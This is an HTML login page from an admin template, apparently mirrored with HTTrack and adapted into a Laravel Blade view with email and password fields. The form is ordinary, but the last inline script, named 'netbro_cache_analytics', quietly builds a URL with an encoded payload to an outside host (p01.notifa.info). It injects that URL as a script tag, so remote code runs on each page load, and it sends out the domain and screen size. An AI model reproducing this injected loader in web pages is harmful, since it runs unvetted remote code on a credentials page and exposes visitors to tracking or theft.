<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from demos.ui-lib.com/gull-html/signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 Jan 2019 04:45:09 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Login</title>
    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,400i,600,700,800,900" rel="stylesheet">
    <link rel="stylesheet" href="{{asset('assets/styles/css/themes/lite-purple.min.css')}}">
</head>

<body>
    <div class="auth-layout-wrap" style="background-image: url(assets/images/photo-wide-4.jpg)">
        <div class="auth-content">
            <div class="card o-hidden">
                <div class="row">
                    <div class="col-md-6">
                        <div class="p-4">
                            <div class="auth-logo text-center mb-4">
                                <img src="assets/images/logo.png" alt="">
                            </div>
                            <h1 class="mb-3 text-18">Sign In</h1>
                            <form class="form-horizontal" method="POST" action="{{ route('login') }}">
                            {{ csrf_field() }}
                                <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }}">
                                    <label for="email">Email address</label>
                                    <input id="email" class="form-control form-control-rounded" type="email" name="email" value="{{ old('email') }}" required autofocus>
                                    @if ($errors->has('email'))
                                        <span class="help-block">
                                            <strong>{{ $errors->first('email') }}</strong>
                                        </span>
                                    @endif
                                </div>
                                <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }}">
                                    <label for="password">Password</label>
                                    <input id="password" class="form-control form-control-rounded" type="password" name="password" required>
                                    @if ($errors->has('password'))
                                        <span class="help-block">
                                            <strong>{{ $errors->first('password') }}</strong>
                                        </span>
                                    @endif
                                </div>
                                <button class="btn btn-rounded btn-primary btn-block mt-2" type="submit">Login</button>

                            </form>

                            <div class="mt-3 text-center">
                                <a href="{{ route('password.request') }}" class="text-muted"><u>Forgot Password?</u></a>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 text-center" style="background-size: cover;background-image: url(assets/images/photo-long-3.jpg)">
                        <!-- <div class="pr-3 auth-right">
                            <a class="btn btn-rounded btn-outline-primary btn-outline-email btn-block btn-icon-text" href="signup.html">
                                <i class="i-Mail-with-At-Sign"></i> Sign up with Email
                            </a>
                            <a class="btn btn-rounded btn-outline-primary btn-outline-google btn-block btn-icon-text">
                                <i class="i-Google-Plus"></i> Sign up with Google
                            </a>
                            <a class="btn btn-rounded btn-outline-primary btn-block btn-icon-text btn-outline-facebook">
                                <i class="i-Facebook-2"></i> Sign up with Facebook
                            </a>
                        </div> -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="{{asset('assets/js/vendor/jquery-3.3.1.min.js')}}"></script>
    <script src="{{asset('assets/js/vendor/bootstrap.bundle.min.js')}}"></script>
    <script src="{{asset('assets/js/es5/script.min.js')}}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2a5sR52uI4geFOGQqdIh7iEjpuu05ZdMy72zno%2bQha3iqFT%2blhVlOirZ3qNfP5qlvkbBroXk%2fK2rRr8Br8tRZzfeK0cjfmZqIoKKfA3XY2b6xWQKLFZrOYBL3N4Q5UbNPwMGpCIKhZfYhjXq6OAiKI386sW4IxYdL56Lozv3lWSy7%2fRF7strm0vSORj%2fKKiIfJ46ec0LgagbVnZkHUyXNTzSw7JEtVVk%2fAFYoLafGnpjW9pSOZ8y2wTeEY8OGjaFT6nRw1tB%2fN8s7tLTWYQsIoRqtuTIf3ZCePHFkolJJM3R%2bEf4B%2bP8kK7VgWNFv3IsfEeTZ4NBcSQDPI9ykDgtmnt%2bmLh3zywt9GBYYudmMEK2xi6fMC7E2ZSIYDB6njUUzoj6jGbg19GPY%2bLP5fplXiQjJGwcldg2mo2ltjfzls06E4KGjeA8HRsBx4uzeRaLXSPwfIKfHvqb573V9mjztjxJ1W02ec9ye9QBtA44YukU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from demos.ui-lib.com/gull-html/signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 Jan 2019 04:45:50 GMT -->
</html>
